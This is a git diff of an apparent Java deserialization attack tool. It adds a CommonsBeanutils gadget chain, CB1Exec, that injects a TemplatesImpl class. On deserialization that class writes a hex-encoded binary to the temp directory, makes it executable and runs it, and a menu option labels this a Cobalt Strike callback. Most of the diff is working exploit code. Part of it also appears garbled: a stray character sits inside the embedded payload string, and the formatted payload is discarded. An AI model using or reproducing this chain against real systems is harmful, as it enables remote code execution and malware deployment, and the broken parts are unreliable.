@@ -15,31 +15,127 @@ import java.util.*;
 public class GadGets {
     // 爆破结束后可用的利用链
     List availableGadgets = new ArrayList();
+    // 实现指定方法摘取
 
-    static class BlastThread extends Thread {
-        @Override
-        public void run() {
-            Thread.currentThread().setName("子线程");
+    /**
+     * methodName 匹配方法名称
+     * 可变长参数接受需要的值 每种链 需要的参数各不相同
+     *
+     * @param methodName
+     * @param parameter
+     * @return
+     */
+    public static Object findMethod(String methodName, String... parameter) throws Exception {
 
-            // 写反射代码 获取当前类下所有方法 排除不需要方法
-            // 爆破利用链时 不爆破到一个就停止 爆破所有利用链 全部存储 然后选中随机利用链代码进行利用
-
-            for (int i = 0; i < 5; i++) {
-                System.out.println(Thread.currentThread().getName() + "---" + i);
-            }
+        if (methodName.equals("CBString WriteFIle(默认)")) {
+            CB1(parameter[0], parameter[1]);
+        } else if (methodName.equals("URLDNS")) {
+            URLDNS(parameter[0]);
+        } else if (methodName.equals("CB反弹CS")) {
+            CB1Exec(parameter[0]);
         }
+        return null;
     }
 
 
-    public static Object blastGadgets() {
-        BlastThread myThread = new BlastThread();
-        myThread.start();  //开辟新线程
-        for (int i = 0; i < 5; i++) {
-            System.out.println(Thread.currentThread().getName() + "---" + i);
-        }
-        return "CB1";
-    }
+//    static class BlastThread extends Thread {
+//        @Override
+//        public void run() {
+//            Thread.currentThread().setName("子线程");
+//
+//            // 写反射代码 获取当前类下所有方法 排除不需要方法
+//            // 爆破利用链时 不爆破到一个就停止 爆破所有利用链 全部存储 然后选中随机利用链代码进行利用
+//
+//            for (int i = 0; i < 5; i++) {
+//                System.out.println(Thread.currentThread().getName() + "---" + i);
+//            }
+//        }
+//    }
 
+
+//    public static Object blastGadgets() {
+//        BlastThread myThread = new BlastThread();
+//        myThread.start();  //开辟新线程
+//        for (int i = 0; i < 5; i++) {
+//            System.out.println(Thread.currentThread().getName() + "---" + i);
+//        }
+//        return "CB1";
+//    }
+
+    /**
+     * CB String ShellCode执行链
+     *
+     * @param fileContent
+     * @return
+     * @throws Exception
+     */
+    public static PriorityQueue CB1Exec(String fileContent) throws Exception {
+        ClassPool pool = ClassPool.getDefault();
+        CtClass payload = pool.makeClass(randomClassName());
+        payload.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
+        // 创建类构造器代码
+        CtConstructor constructor = new CtConstructor(new CtClass[]{}, payload);
+        String payStr = "{\n" +
+                "StringBuffer OumFpdtWO = new StringBuffer();\n" +
+                "        OumFpdtWO.append(\"%s\");\n" +
+                "        String ACvQufdjkUlCUzq = System.getProperty(\"java.io.tmpdir\") + \"/UgNQKFeYBrUiH\";\n" +
+                "\n" +
+                "        if (System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") != -1) {\n" +
+                "         y   ACvQufdjkUlCUzq = ACvQufdjkUlCUzq.concat(\".exe\");\n" +
+                "        }\n" +
+                "\n" +
+                "        int ZYOLGixIbAH = OumFpdtWO.length();\n" +
+                "        byte[] SBkuJuwWQCk = new byte[ZYOLGixIbAH / 2];\n" +
+                "        for (int nHTFeapqT = 0; nHTFeapqT < ZYOLGixIbAH; nHTFeapqT += 2) {\n" +
+                "            SBkuJuwWQCk[nHTFeapqT / 2] = (byte) ((Character.digit(OumFpdtWO.charAt(nHTFeapqT), 16) << 4)\n" +
+                "                    + Character.digit(OumFpdtWO.charAt(nHTFeapqT + 1), 16));\n" +
+                "        }\n" +
+                "\n" +
+                "        FileOutputStream PGjwnJmEi = new FileOutputStream(ACvQufdjkUlCUzq);\n" +
+                "        PGjwnJmEi.write(SBkuJuwWQCk);\n" +
+                "        PGjwnJmEi.flush();\n" +
+                "        PGjwnJmEi.close();\n" +
+                "\n" +
+                "        if (System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") == -1) {\n" +
+                "            String[] eTjGmrdx = new String[3];\n" +
+                "            eTjGmrdx[0] = \"chmod\";\n" +
+                "            eTjGmrdx[1] = \"+x\";\n" +
+                "            eTjGmrdx[2] = ACvQufdjkUlCUzq;\n" +
+                "            Process HcMnvXKQYOws = Runtime.getRuntime().exec(eTjGmrdx);\n" +
+                "            if (HcMnvXKQYOws.waitFor() == 0) {\n" +
+                "                HcMnvXKQYOws = Runtime.getRuntime().exec(ACvQufdjkUlCUzq);\n" +
+                "            }\n" +
+                "\n" +
+                "            File IuSMglkaIU = new File(ACvQufdjkUlCUzq);\n" +
+                "            IuSMglkaIU.delete();\n" +
+                "        } else {\n" +
+                "            String[] fecgBqEcF = new String[1];\n" +
+                "            fecgBqEcF[0] = ACvQufdjkUlCUzq;\n" +
+                "            Process HcMnvXKQYOws = Runtime.getRuntime().exec(fecgBqEcF);\n" +
+                "        }" +
+                "}";
+        String.format(payStr, fileContent);
+        System.out.println(payStr);
+        constructor.setBody(payStr);
+        payload.addConstructor(constructor);
+
+        byte[] evilClass = payload.toBytecode();
+        TemplatesImpl templates = new TemplatesImpl();
+
+        setFieldValue(templates, "_bytecodes", new byte[][]{evilClass});
+        setFieldValue(templates, "_name", "test");
+        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
+
+        BeanComparator beanComparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
+        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, beanComparator);
+        queue.add("1");
+        queue.add("1");
+
+        setFieldValue(beanComparator, "property", "outputProperties");
+        setFieldValue(queue, "queue", new Object[]{templates, templates});
+
+        return queue;
+    }
 
     /**
      * URLDNS 利用链
